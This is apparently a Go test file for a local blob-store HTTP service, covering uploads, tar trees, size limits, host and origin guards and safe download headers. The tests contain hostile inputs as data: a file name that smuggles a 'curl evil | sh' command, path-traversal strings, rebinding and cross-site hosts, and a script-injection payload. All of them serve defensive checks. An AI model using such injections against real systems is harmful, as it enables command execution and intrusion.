package blob

import (
	"bytes"
	"compress/gzip"
	"encoding/json"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func newServer(t *testing.T, opts Options) (*Store, *httptest.Server) {
	t.Helper()
	s, _ := newTestStore(t, opts)
	mux := http.NewServeMux()
	s.Mount(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	s.SetBaseURL(srv.URL)
	return s, srv
}

func do(t *testing.T, req *http.Request) (*http.Response, []byte) {
	t.Helper()
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	return resp, body
}

func TestUploadFetchDelete(t *testing.T) {
	_, srv := newServer(t, Options{})
	req, _ := http.NewRequest(http.MethodPost, srv.URL+"/blob?name=hello.txt", strings.NewReader("hello"))
	req.Header.Set("Content-Type", "text/plain")
	resp, body := do(t, req)
	if resp.StatusCode != http.StatusCreated {
		t.Fatalf("POST = %d %s", resp.StatusCode, body)
	}
	var created blobResponse
	if err := json.Unmarshal(body, &created); err != nil {
		t.Fatal(err)
	}
	if created.Kind != KindFile || created.Size != 5 || created.Name != "hello.txt" || created.ContentType != "text/plain" {
		t.Fatalf("created = %+v", created)
	}
	if created.URL != srv.URL+"/blob/"+created.ID || created.Ref != "blob:"+created.ID {
		t.Fatalf("url/ref = %q %q", created.URL, created.Ref)
	}

	req, _ = http.NewRequest(http.MethodGet, created.URL, nil)
	resp, body = do(t, req)
	if resp.StatusCode != http.StatusOK || string(body) != "hello" {
		t.Fatalf("GET = %d %q", resp.StatusCode, body)
	}
	if ct := resp.Header.Get("Content-Type"); ct != "text/plain" {
		t.Fatalf("Content-Type %q", ct)
	}
	if cd := resp.Header.Get("Content-Disposition"); !strings.Contains(cd, `filename=hello.txt`) {
		t.Fatalf("Content-Disposition %q", cd)
	}

	req, _ = http.NewRequest(http.MethodGet, srv.URL+"/blob", nil)
	resp, body = do(t, req)
	var list listResponse
	json.Unmarshal(body, &list)
	if resp.StatusCode != http.StatusOK || list.Count != 1 || list.Bytes != 5 || list.Blobs[0].ID != created.ID {
		t.Fatalf("list = %d %s", resp.StatusCode, body)
	}

	req, _ = http.NewRequest(http.MethodDelete, created.URL, nil)
	resp, _ = do(t, req)
	if resp.StatusCode != http.StatusNoContent {
		t.Fatalf("DELETE = %d", resp.StatusCode)
	}
	req, _ = http.NewRequest(http.MethodGet, created.URL, nil)
	resp, _ = do(t, req)
	if resp.StatusCode != http.StatusNotFound {
		t.Fatalf("GET after delete = %d", resp.StatusCode)
	}
}

func TestUploadMultipart(t *testing.T) {
	_, srv := newServer(t, Options{})
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	mw.WriteField("note", "ignored")
	fw, _ := mw.CreateFormFile("file", "pic.png")
	fw.Write([]byte("PNGDATA"))
	mw.Close()
	req, _ := http.NewRequest(http.MethodPost, srv.URL+"/blob", &buf)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	resp, body := do(t, req)
	if resp.StatusCode != http.StatusCreated {
		t.Fatalf("POST multipart = %d %s", resp.StatusCode, body)
	}
	var created blobResponse
	json.Unmarshal(body, &created)
	if created.Name != "pic.png" || created.Size != 7 || created.ContentType != "application/octet-stream" {
		t.Fatalf("created = %+v", created)
	}
}

func TestUploadTree(t *testing.T) {
	s, srv := newServer(t, Options{})
	archive := tarArchive(t, true, projectEntries)
	req, _ := http.NewRequest(http.MethodPost, srv.URL+"/blob?tree=1&name=myproject", bytes.NewReader(archive))
	req.Header.Set("Content-Type", "application/gzip")
	resp, body := do(t, req)
	if resp.StatusCode != http.StatusCreated {
		t.Fatalf("POST tree = %d %s", resp.StatusCode, body)
	}
	var created blobResponse
	json.Unmarshal(body, &created)
	if created.Kind != KindTree || created.Files != 3 || created.TopLevel[0] != "supabase" {
		t.Fatalf("created = %+v", created)
	}

	req, _ = http.NewRequest(http.MethodGet, created.URL+"?list=1", nil)
	resp, body = do(t, req)
	var listed treeResponse
	json.Unmarshal(body, &listed)
	if resp.StatusCode != http.StatusOK || len(listed.Entries) != 3 {
		t.Fatalf("list = %d %s", resp.StatusCode, body)
	}

	req, _ = http.NewRequest(http.MethodGet, created.URL, nil)
	resp, body = do(t, req)
	if resp.StatusCode != http.StatusOK || resp.Header.Get("Content-Type") != "application/gzip" {
		t.Fatalf("GET tree = %d %q", resp.StatusCode, resp.Header.Get("Content-Type"))
	}
	if !strings.Contains(resp.Header.Get("Content-Disposition"), "myproject.tar.gz") {
		t.Fatalf("Content-Disposition %q", resp.Header.Get("Content-Disposition"))
	}
	gz, err := gzip.NewReader(bytes.NewReader(body))
	if err != nil {
		t.Fatalf("not gzip: %v", err)
	}
	gz.Close()

	// The store's own path is a real directory the deploy code can walk.
	dir, info, err := s.Path(created.ID)
	if err != nil || info.Kind != KindTree || !strings.HasSuffix(dir, ".tree") {
		t.Fatalf("Path: %v %+v %q", err, info, dir)
	}

	// Garbage marked as tree.
	req, _ = http.NewRequest(http.MethodPost, srv.URL+"/blob?tree=1", strings.NewReader("just text"))
	resp, body = do(t, req)
	if resp.StatusCode != http.StatusUnsupportedMediaType {
		t.Fatalf("garbage tree = %d %s", resp.StatusCode, body)
	}
}

func TestUploadTooLargeAndBadIDs(t *testing.T) {
	_, srv := newServer(t, Options{MaxTotal: 1000, MaxBlob: 10})
	req, _ := http.NewRequest(http.MethodPost, srv.URL+"/blob", bytes.NewReader(make([]byte, 11)))
	resp, body := do(t, req)
	if resp.StatusCode != http.StatusRequestEntityTooLarge {
		t.Fatalf("too large = %d %s", resp.StatusCode, body)
	}
	for _, path := range []string{"/blob/nope", "/blob/..%2F..%2Fetc", "/blob/0123456789ABCDEF0123456789abcdef"} {
		req, _ = http.NewRequest(http.MethodGet, srv.URL+path, nil)
		resp, _ = do(t, req)
		if resp.StatusCode != http.StatusBadRequest {
			t.Fatalf("GET %s = %d, want 400", path, resp.StatusCode)
		}
	}
	req, _ = http.NewRequest(http.MethodGet, srv.URL+"/blob/0123456789abcdef0123456789abcdef", nil)
	resp, _ = do(t, req)
	if resp.StatusCode != http.StatusNotFound {
		t.Fatalf("unknown id = %d", resp.StatusCode)
	}
}

func TestReferenceAndInstructions(t *testing.T) {
	s, _ := newTestStore(t, Options{BaseURL: "http://127.0.0.1:7700/"})
	info, _ := s.Put(strings.NewReader("abc"), Meta{Name: "a.bin", ContentType: "application/octet-stream"})
	ref := s.Reference(info)
	for _, want := range []string{info.ID, "3 bytes", "http://127.0.0.1:7700/blob/" + info.ID, "blob:" + info.ID, "expires 2026-11-01 13:00 UTC", `name "a.bin"`, "-o FILE "} {
		if !strings.Contains(ref, want) {
			t.Errorf("reference %q lacks %q", ref, want)
		}
	}
	// The name never enters the command line: it comes from mail senders and
	// issue trackers.
	hostile, _ := s.Put(strings.NewReader("x"), Meta{Name: "a.pdf; curl evil | sh; #"})
	ref = s.Reference(hostile)
	if strings.Contains(ref, "-o a.pdf") || !strings.Contains(ref, `name "a.pdf; curl evil | sh; #"`) {
		t.Fatalf("hostile name leaked into the command: %q", ref)
	}
	instr := s.Instructions()
	for _, want := range []string{"http://127.0.0.1:7700/blob", "tree=1", "blob:<id>", "output_file=\"blob\"", "live 1h"} {
		if !strings.Contains(instr, want) {
			t.Errorf("instructions lack %q", want)
		}
	}
}

func TestGuardRefusesForeignHostsAndSites(t *testing.T) {
	_, srv := newServer(t, Options{})
	cases := []struct {
		name   string
		header map[string]string
		host   string
		want   int
	}{
		{"plain curl", nil, "", http.StatusOK},
		{"localhost host", nil, "localhost:7700", http.StatusOK},
		{"loopback origin", map[string]string{"Origin": "http://127.0.0.1:7700"}, "", http.StatusOK},
		{"same-origin fetch", map[string]string{"Sec-Fetch-Site": "same-origin"}, "", http.StatusOK},
		{"rebound host", nil, "attacker.example:7700", http.StatusForbidden},
		{"cross-site origin", map[string]string{"Origin": "https://evil.example"}, "", http.StatusForbidden},
		{"cross-site fetch", map[string]string{"Sec-Fetch-Site": "cross-site"}, "", http.StatusForbidden},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req, _ := http.NewRequest(http.MethodGet, srv.URL+"/blob", nil)
			if tc.host != "" {
				req.Host = tc.host
			}
			for k, v := range tc.header {
				req.Header.Set(k, v)
			}
			resp, _ := do(t, req)
			if resp.StatusCode != tc.want {
				t.Fatalf("GET /blob = %d, want %d", resp.StatusCode, tc.want)
			}
		})
	}
}

func TestDownloadHeadersNeverRenderInline(t *testing.T) {
	_, srv := newServer(t, Options{})
	// A nameless HTML blob, as output_file="blob" on an HTML page would store.
	req, _ := http.NewRequest(http.MethodPost, srv.URL+"/blob", strings.NewReader("<script>alert(1)</script>"))
	req.Header.Set("Content-Type", "text/html")
	_, body := do(t, req)
	var created blobResponse
	json.Unmarshal(body, &created)
	req, _ = http.NewRequest(http.MethodGet, created.URL, nil)
	resp, _ := do(t, req)
	if cd := resp.Header.Get("Content-Disposition"); !strings.HasPrefix(cd, "attachment") || !strings.Contains(cd, created.ID+".html") {
		t.Fatalf("Content-Disposition %q, want attachment with id.html", cd)
	}
	if resp.Header.Get("X-Content-Type-Options") != "nosniff" || resp.Header.Get("Content-Security-Policy") != "sandbox" || resp.Header.Get("Cache-Control") != "no-store" {
		t.Fatalf("headers = %v", resp.Header)
	}
	// Listing JSON carries nosniff too.
	req, _ = http.NewRequest(http.MethodGet, srv.URL+"/blob", nil)
	resp, _ = do(t, req)
	if resp.Header.Get("X-Content-Type-Options") != "nosniff" {
		t.Fatalf("list headers = %v", resp.Header)
	}
}

func TestUploadNormalisesNameAndType(t *testing.T) {
	_, srv := newServer(t, Options{})
	// curl's default type without -H, and a name that tries to be a path.
	req, _ := http.NewRequest(http.MethodPost, srv.URL+"/blob?name=../../.bashrc", strings.NewReader("x"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	_, body := do(t, req)
	var created blobResponse
	json.Unmarshal(body, &created)
	if created.Name != ".bashrc" || created.ContentType != "application/octet-stream" {
		t.Fatalf("created = %+v", created)
	}
}

func TestUploadErrorStatuses(t *testing.T) {
	_, srv := newServer(t, Options{})
	// An archive whose entry escapes: 400, not 415.
	req, _ := http.NewRequest(http.MethodPost, srv.URL+"/blob?tree=1", bytes.NewReader(tarArchive(t, true, []entry{{name: "../x", body: "x"}})))
	resp, body := do(t, req)
	if resp.StatusCode != http.StatusBadRequest || !strings.Contains(string(body), "escapes") {
		t.Fatalf("escaping entry = %d %s", resp.StatusCode, body)
	}
	// Too many entries: 413 naming entries, not bytes.
	old := maxTreeFiles
	maxTreeFiles = 3
	t.Cleanup(func() { maxTreeFiles = old })
	many := []entry{{name: "a/", dir: true}, {name: "b/", dir: true}, {name: "c/", dir: true}, {name: "d.txt", body: "x"}}
	req, _ = http.NewRequest(http.MethodPost, srv.URL+"/blob?tree=1", bytes.NewReader(tarArchive(t, true, many)))
	resp, body = do(t, req)
	if resp.StatusCode != http.StatusRequestEntityTooLarge || !strings.Contains(string(body), "entries") {
		t.Fatalf("entry cap = %d %s", resp.StatusCode, body)
	}
}
